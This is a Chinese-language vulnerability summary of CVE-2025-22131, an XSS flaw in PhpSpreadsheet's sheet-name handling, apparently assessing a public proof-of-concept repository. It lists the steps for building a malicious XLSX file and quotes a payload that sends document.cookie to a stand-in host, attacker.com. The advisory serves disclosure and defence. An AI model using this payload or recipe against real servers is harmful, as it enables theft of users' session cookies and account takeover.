## CVE-2025-22131-PhpSpreadsheet-XSS

**漏洞编号:** CVE-2025-22131

**漏洞类型:** 跨站脚本 (XSS)

**影响应用:** PhpSpreadsheet

**危害等级:** 中危，可能导致cookie泄露和权限提升

**影响版本:** < 1.29.8, >= 2.2.0, < 2.3.6, >= 2.0.0, < 2.1.7, >= 3.0.0, < 3.8.0

**利用条件:** 需要用户交互（打开恶意XLSX文件），服务器端允许上传XLSX文件并以HTML形式展示

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于PhpSpreadsheet库的`generateNavigation()`函数中，该函数用于将XLSX文件转换为HTML表示形式时，未正确转义sheet名称，导致XSS漏洞。

**有效性：**
提供的PoC代码有效。它展示了如何通过创建一个包含多个sheet的XLSX文件，然后修改sheet名称为XSS payload，再重新打包XLSX文件，最后上传到存在漏洞的服务器上来触发XSS漏洞，进而窃取用户的Cookie。

**投毒风险：**
`gen.sh`脚本用于自动化生成恶意XLSX文件，其中包含从命令行参数获取的URL，并将document.cookie发送到该URL。虽然此脚本本身不是恶意软件，但如果攻击者控制了包含此脚本的仓库，并将其修改为包含额外的恶意代码（例如下载和执行其他payload），则可能存在投毒风险。这个脚本依赖于用户提供的URL，如果提供的URL本身就是恶意的，那么也会导致风险。总体来说，投毒风险较低，主要取决于脚本的使用方式和所依赖的外部资源。

**利用方式：**
1.  创建一个包含多个sheet的XLSX文件。
2.  解压XLSX文件。
3.  修改`xl/workbook.xml`文件，将sheet名称替换为包含XSS payload的字符串，例如`<img src=x onerror=fetch('http://attacker.com/?'+document.cookie)>`。
4.  重新打包XLSX文件。
5.  上传恶意XLSX文件到存在漏洞的服务器。
6.  当用户打开或预览包含恶意XLSX文件的页面时，XSS payload将被执行，攻击者可以窃取用户的Cookie或其他敏感信息。

根据搜索引擎结果,多家安全机构确认了该漏洞的存在,并且提供了缓解步骤,但是没有发现公开的直接可用的exp。因此,poc的有效性较高。
Red Hat表示不受影响，可能因为其产品中未使用受影响的PhpSpreadsheet版本或已采取了缓解措施。


**项目地址:** [ZzN1NJ4/CVE-2025-22131-PoC](https://github.com/ZzN1NJ4/CVE-2025-22131-PoC)

**漏洞详情:** [CVE-2025-22131](https://nvd.nist.gov/vuln/detail/CVE-2025-22131)